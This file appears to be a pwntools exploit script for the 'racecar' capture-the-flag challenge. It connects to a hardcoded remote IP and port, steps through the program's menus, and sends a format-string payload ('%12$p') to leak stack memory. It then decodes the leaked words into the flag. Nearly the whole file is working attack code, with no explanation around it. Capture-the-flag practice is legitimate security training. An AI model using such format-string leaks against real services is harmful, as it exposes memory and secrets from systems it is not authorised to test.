from pwn import *
import os

'''
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


#gdbscript = '''
#init-pwndbg
#continue
'''.format(**locals())
exe = '.racecar'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
'''

os.system('clear')
context.log_level = 'debug' 
payload = ""

for i in range(12, 13):
    payload += "%" + str(i) + "$p " # sh.sendline('%' + str(i) + '$s')

sh = remote('157.245.41.35', 30606)
sh.recvuntil(": ")
sh.sendline(b'Nicolas')
sh.recvuntil(": ")
sh.sendline(b'Nic')
sh.recvuntil("> ")
sh.sendline(b'2')
sh.recvuntil("> ")
sh.sendline(b'1')
sh.recvuntil("> ")
sh.sendline(b'2')
sh.recvuntil("> ")
sh.sendline(payload)
sh.recv()
result = sh.recv()
print(result)


output = (result.decode("utf-8").split("m\n"))[1]
output = output.split()

flag = ""
for items in output:
    flag += p32(int(items, base = 16)).decode("utf-8") #base 16 -> hex , then decode it

print(flag)
